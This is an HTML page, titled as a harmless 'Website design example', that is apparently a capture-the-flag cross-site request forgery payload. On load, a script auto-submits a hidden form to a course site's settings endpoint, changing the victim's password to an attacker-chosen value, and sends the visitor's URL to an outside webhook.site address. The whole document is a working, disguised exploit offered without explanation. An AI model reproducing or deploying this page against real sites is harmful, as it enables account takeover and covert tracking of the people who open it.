
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Website design example</title>
</head>
<body>
    <form
        id="csrf-form"
        action="https://cats.is-course.ru/settings"
        method="POST"
    >
        <input
            type="password"
            name="password"
            value="CTFpasspass123!"
        >
        <input
            type="password"
            name="confirm-password"
            value="CTFpasspass123!"
        >
    </form>

    <script>
        new Image().src =
        "https://webhook.site/ab97f7af-a0ce-4a18-a33b-a3760de7e8fe?visited=" +
        encodeURIComponent(location.href);
        document.getElementById("csrf-form").submit();
    </script>
</body>
</html>
